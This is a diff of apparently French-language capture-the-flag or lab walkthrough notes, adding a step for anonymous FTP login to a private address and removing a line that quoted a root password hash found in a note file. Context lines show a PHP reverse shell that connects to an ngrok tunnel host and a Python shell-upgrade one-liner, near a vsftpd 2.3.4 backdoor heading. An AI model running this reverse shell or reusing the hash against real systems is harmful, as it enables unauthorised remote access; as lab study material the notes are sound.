@@ -46,6 +46,12 @@ php -r '$sock=fsockopen("2.tcp.ngrok.io",15705);exec("/bin/sh -i <&3 >&3 2>&3");
 upgrade : 
 python3 -c 'import pty;pty.spawn("/bin/bash")';
 
+# ftp anonymous
+
+* Solution : ftp 10.1.0.188
+
+    Mettre 'anonymous' en nom
+
 # vstfp:2.3.4 backdoor
 
 * Solution :
@@ -90,10 +96,6 @@ ls ~
 pense_bete.txt
 
 cat ~/pense_bete.txt
-
-Pense-bête pour le mdp root de l'autre machine:
-
-dc15d3f5ab9656bc55f7a2f5d1e3a0a5
 
 * Solution :
 
